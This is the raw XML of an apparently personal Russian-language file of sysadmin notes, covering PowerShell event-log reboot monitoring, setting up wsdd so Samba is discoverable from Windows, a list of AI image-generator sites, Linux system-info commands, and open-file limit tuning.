      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iOS: Lockdown (https://apps.apple.com/in/app/lockdown-apps/id1469783711)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P9" loext:marker-style-name="T2"><text:span text:style-name="T3">Hardware: IPFire (https://www.ipfire.org/); Shorewall (https://shorewall.org/); OpenSense (https://opnsense.org/)</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T3">Powershell</text:span><text:span text:style-name="T1"> мониторинг событий 41, 1074, 6008. Мониторинг по событию </text:span><text:span text:style-name="T3">41:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 41} |</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ForEach-Object {</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>$flam = New-Object PSObject | Select-Object Date</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>if ($_.ReplacementStrings[4]) {</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>$flam.Date = $_.TimeGenerated</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="8"/>$flam</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="4"/>}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">} </text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$StrData=[string]$flam.Date</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$message = $StrData + " " + "Сервер: $env:computername" + " " + "Система перезагрузилась, завершив работу с ошибками. </text:span><text:span text:style-name="T1">Возможные причины ошибки: система перестала отвечать на запросы, произошел критический сбой или неожиданно отключилось питание."</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">-----------------------------------------</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Мониторинг по событию 1074:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 1074}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat = New-Object System.Management.Automation.PSObject</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Time ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty User ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Action ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events | %{</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Time = $_.TimeGenerated</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Action = $_.ReplacementStrings[4]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Мониторинг по событию 6008:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events = Get-EventLog -LogName System -After (((Get-Date).addDays(-2)).date) -Before <text:s/>(Get-Date) | where {$_.EventId -eq 6008}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat = New-Object System.Management.Automation.PSObject</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Time ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty User ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat | Add-Member NoteProperty Action ($null)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$Events | %{</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Time = $_.TimeGenerated</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.User = $_.ReplacementStrings[6]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$FlamDat.Action = $_.Message</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">}</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$StrFlamDat=[string]$FlamDat.Time</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P9" loext:marker-style-name="T2"><text:span text:style-name="T3">$message = $env:computername + " " + $StrFlamDat + " " + $FlamDat.Action + " " + $FlamDat.User</text:span></text:p>
      <text:p text:style-name="P9" loext:marker-style-name="T2"><text:span text:style-name="T1">Включаем отображение </text:span><text:span text:style-name="T3">Samba</text:span><text:span text:style-name="T1">-сервера в сетевом окружении </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1">. В последних версиях </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">samba</text:span><text:span text:style-name="T1">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3">Windows</text:span><text:span text:style-name="T1"> протокола </text:span><text:span text:style-name="T3">SMB</text:span><text:span text:style-name="T1">1 и невозможностью обнаружить </text:span><text:span text:style-name="T3">Samba</text:span><text:span text:style-name="T1"> по протоколу </text:span><text:span text:style-name="T3">NetBIOS</text:span><text:span text:style-name="T1">. Современные </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1"> системы используют для обнаружения устройств </text:span><text:span text:style-name="T3">WSD</text:span><text:span text:style-name="T1"> (</text:span><text:span text:style-name="T3">Web</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Services</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">for</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">Devices</text:span><text:span text:style-name="T1">) и сегодня мы расскажем, как добавить его поддержку для вашего сервера </text:span><text:span text:style-name="T3">Samba</text:span><text:span text:style-name="T1">. Для включения поддержки </text:span><text:span text:style-name="T3">WSD</text:span><text:span text:style-name="T1"> нам потребуется пакет </text:span><text:span text:style-name="T3">wsdd</text:span><text:span text:style-name="T1">, который штатно присутствует в репозиториях </text:span><text:span text:style-name="T3">Debian</text:span><text:span text:style-name="T1"> 12 и </text:span><text:span text:style-name="T3">Ubuntu</text:span><text:span text:style-name="T1"> 22.04, если вы используете другие версии систем, то вам потребуется подключить репозиторий разработчиков, он поддерживает </text:span><text:span text:style-name="T3">Debian</text:span><text:span text:style-name="T1"> 9 - 11, и </text:span><text:span text:style-name="T3">Ubuntu</text:span><text:span text:style-name="T1"> 16.04 - 22.04. Чтобы подключить репозиторий разработчиков сначала скачайте и импортируйте в хранилище ключ: </text:span><text:span text:style-name="T3">wget</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">O</text:span><text:span text:style-name="T1">- </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">pkg</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ltec</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ch</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">conf</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">ltec</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">ag</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gpg</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">key</text:span><text:span text:style-name="T1"> | </text:span><text:span text:style-name="T3">gpg</text:span><text:span text:style-name="T1"> --</text:span><text:span text:style-name="T3">dearmour</text:span><text:span text:style-name="T1"> &gt; /</text:span><text:span text:style-name="T3">usr</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">share</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">keyrings</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">wsdd</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gpg</text:span><text:span text:style-name="T1">. Теперь подключим сам репозиторий: </text:span><text:span text:style-name="T3">echo</text:span><text:span text:style-name="T1"> "</text:span><text:span text:style-name="T3">deb</text:span><text:span text:style-name="T1"> [</text:span><text:span text:style-name="T3">signed</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">by</text:span><text:span text:style-name="T1">=/</text:span><text:span text:style-name="T3">usr</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">share</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">keyrings</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">wsdd</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">gpg</text:span><text:span text:style-name="T1">] </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">pkg</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ltec</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">ch</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">public</text:span><text:span text:style-name="T1">/ `</text:span><text:span text:style-name="T3">lsb</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">release</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">cs</text:span><text:span text:style-name="T1">` </text:span><text:span text:style-name="T3">main</text:span><text:span text:style-name="T1">" &gt; /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">apt</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sources</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">d</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">wsdd</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">list</text:span><text:span text:style-name="T1">. Обновим список пакетов и установим нужную нам службу:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#</text:span><text:span text:style-name="T3">apt</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">update</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">#</text:span><text:span text:style-name="T3">apt</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">install</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">wsdd</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пакет будет автоматически добавлен в автозагрузку и нам останется только запустить его и проверить статус:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># systemctl start wsdd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># systemctl status wsdd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">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1">в файл /</text:span><text:span text:style-name="T3">etc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">default</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">wsdd</text:span><text:span text:style-name="T1">, в нем находится единственная допустимая опция: </text:span><text:span text:style-name="T3">WSDD</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">PARAMS</text:span><text:span text:style-name="T1">="".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3">ens</text:span><text:span text:style-name="T1">33 и протоколом </text:span><text:span text:style-name="T3">IPv</text:span><text:span text:style-name="T1">4, то добавим: </text:span><text:span text:style-name="T3">WSDD</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">PARAMS</text:span><text:span text:style-name="T1">="--</text:span><text:span text:style-name="T3">interface</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ens</text:span><text:span text:style-name="T1">33 --</text:span><text:span text:style-name="T3">ipv</text:span><text:span text:style-name="T1">4</text:span><text:span text:style-name="T3">only</text:span><text:span text:style-name="T1">" Либо: </text:span><text:span text:style-name="T3">WSDD</text:span><text:span text:style-name="T1">_</text:span><text:span text:style-name="T3">PARAMS</text:span><text:span text:style-name="T1">="-</text:span><text:span text:style-name="T3">i</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">ens</text:span><text:span text:style-name="T1">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3">systemctl</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">restart</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">wsdd</text:span><text:span text:style-name="T1">. Для нормальной работы службы вам также нужно разрешить в брандмауэре входящие соединения для </text:span><text:span text:style-name="T3">UDP</text:span><text:span text:style-name="T1"> 3702 и </text:span><text:span text:style-name="T3">TCP</text:span><text:span text:style-name="T1"> 5357. Со стороны </text:span><text:span text:style-name="T3">Windows</text:span><text:span text:style-name="T1"> делать ничего не нужно, </text:span><text:span text:style-name="T3">Samba</text:span><text:span text:style-name="T1">-сервера автоматически появятся в вашем сетевом окружении.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Представляю первую часть подборки легендарных сервисов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">unrealperson</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - лица людей;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">thismodeldoesnotexist</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">co</text:span><text:span text:style-name="T1">/ - инстаграмные фото «модели»;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">3. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">thishottieisnotreal</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - красивые женщины;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">4. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">thiswaifudoesnotexist</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">net</text:span><text:span text:style-name="T1">/ - аниме персонажи;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">5. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">thisautomobiledoesnotexist</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - автомобили;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">6. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">thisfoodblogdoesnotexist</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - крутые фото еды;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">7. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">www</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">thisgraffitidoesnotexist</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - граффити;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">8. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">thisrentaldoesnotexist</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - номера отелей;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">9. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">imgflip</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">ai</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">meme</text:span><text:span text:style-name="T1"> - мемы (неплохие!);</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T1">10. </text:span><text:span text:style-name="T3">https</text:span><text:span text:style-name="T1">://</text:span><text:span text:style-name="T3">thispersondoesnotexist</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">com</text:span><text:span text:style-name="T1">/ - лица людей.</text:span></text:p>
      <text:p text:style-name="P8"><text:span text:style-name="T1">Команды для получения сведений о системе, активности пользователей:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">date</text:span><text:span text:style-name="T1"> - вывести текущую дату и время</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">cal</text:span><text:span text:style-name="T1"> - вывести календарь на текущий месяц</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">uptime</text:span><text:span text:style-name="T1"> - показать время с момента последней загрузки ОС.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">w</text:span><text:span text:style-name="T1"> - сведения о пользователях, зарегистрировавшихся в системе</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">users</text:span><text:span text:style-name="T1"> - список имен пользователей, вошедших в систему.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - список пользователей, вошедших в систему по данным из специального файла /</text:span><text:span text:style-name="T3">var</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">log</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">wtmp</text:span><text:span text:style-name="T1">. Отображается имя, терминал, время входа </text:span><text:span text:style-name="T3">IP</text:span><text:span text:style-name="T1">-адрес и т.п.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">ad</text:span><text:span text:style-name="T1"> - сведения о пользователях, вошедших в систему, с отображением в последней колонке имени компьютера с которого выполнен вход.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">F</text:span><text:span text:style-name="T1"> - отобразить время входа пользователей в систему, длительность сессий и время выхода.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> - </text:span><text:span text:style-name="T3">x</text:span><text:span text:style-name="T1"> - отобразить сведения о выключениях, перезагрузках и изменениях уровня запуска системы.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">root</text:span><text:span text:style-name="T1"> - отобразить сведения о сеансах пользователя </text:span><text:span text:style-name="T3">root</text:span><text:span text:style-name="T1">.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">last</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">n</text:span><text:span text:style-name="T1"> 10 </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1">1 - отобразить сведения о десяти последних сеансах пользователя </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1">1.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">lastlog</text:span><text:span text:style-name="T1"> - отобразить список всех пользователей и время их последнего входа в систему.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:soft-page-break/><text:span text:style-name="T3">whoami</text:span><text:span text:style-name="T1"> - имя, под которым вы в данный момент работаете в системе.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">finger</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">user</text:span><text:span text:style-name="T1"> - показать информацию о </text:span><text:span text:style-name="T3">user</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">uname</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">a</text:span><text:span text:style-name="T1"> - отобразить все сведения о системе.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">uname</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">vr</text:span><text:span text:style-name="T1"> - отобразить номер выпуска операционной системы и версию ядра.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">df</text:span><text:span text:style-name="T1"> - отобразить информацию об использовании дисков.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">du</text:span><text:span text:style-name="T1"> - отобразить информацию об использовании текущего каталога</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">free</text:span><text:span text:style-name="T1"> - информация об использовании реальной и виртуальной памяти.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">whatis</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> - отобразить краткую информацию об </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> из базы данных документации.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">whereis</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> - где находится исполняемый модуль </text:span><text:span text:style-name="T3">app</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">which</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> - какой исполняемый модуль приложения </text:span><text:span text:style-name="T3">app</text:span><text:span text:style-name="T1"> будет запущен по умолчанию.</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">man</text:span><text:span text:style-name="T1"> </text:span><text:span text:style-name="T3">command</text:span><text:span text:style-name="T1"> - отобразить справочную информацию для команды </text:span><text:span text:style-name="T3">command</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Как найти количество открытых файлов в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Значение сохраняется в</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">cat</text:span><text:span text:style-name="T1"> /</text:span><text:span text:style-name="T3">proc</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">sys</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">/</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка </text:span><text:span text:style-name="T3">Hard</text:span><text:span text:style-name="T1"> лимит в </text:span><text:span text:style-name="T3">Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ulimit</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">Hn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Проверка </text:span><text:span text:style-name="T3">Soft</text:span><text:span text:style-name="T1"> лимит в </text:span><text:span text:style-name="T3">Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># </text:span><text:span text:style-name="T3">ulimit</text:span><text:span text:style-name="T1"> -</text:span><text:span text:style-name="T3">Sn</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Чтобы просмотреть значения </text:span><text:span text:style-name="T3">Hard</text:span><text:span text:style-name="T1"> и </text:span><text:span text:style-name="T3">Soft</text:span><text:span text:style-name="T1"> для разных пользователей, переключите пользователя с «</text:span><text:span text:style-name="T3">su</text:span><text:span text:style-name="T1">» на пользователя, ограничения которого вы хотите проверить.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">Например:</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># su root</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ulimit -Sn</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P12" loext:marker-style-name="T2"><text:span text:style-name="T3">$ ulimit -Hn</text:span></text:p>
      <text:p text:style-name="P8" loext:marker-style-name="T2"><text:span text:style-name="T1">Как проверить количество системных дескрипторов файлов в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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3">MySQL</text:span><text:span text:style-name="T1"> / </text:span><text:span text:style-name="T3">MariaDB</text:span><text:span text:style-name="T1"> или веб-сервер </text:span><text:span text:style-name="T3">Apache</text:span><text:span text:style-name="T1">. Вы можете увеличить лимит открытых файлов в </text:span><text:span text:style-name="T3">Linux</text:span><text:span text:style-name="T1">, отредактировав опцию ядра </text:span><text:span text:style-name="T3">fs</text:span><text:span text:style-name="T1">.</text:span><text:span text:style-name="T3">file</text:span><text:span text:style-name="T1">-</text:span><text:span text:style-name="T3">max</text:span><text:span text:style-name="T1">. Для этого используйте утилиту </text:span><text:span text:style-name="T3">sysctl</text:span><text:span text:style-name="T1">. </text:span><text:span text:style-name="T3">Sysctl</text:span><text:span text:style-name="T1">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1" loext:marker-style-name="T2"><text:span text:style-name="T3"># sysctl -w fs.file-max=500000</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вы можете проверить текущее значение для количества открытых файлов с помощью следующей команды:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">$ cat /proc/sys/fs/file-max</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">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1">применить их на постоянной основе, вам придется отредактировать следующий файл:</text:span></text:p>
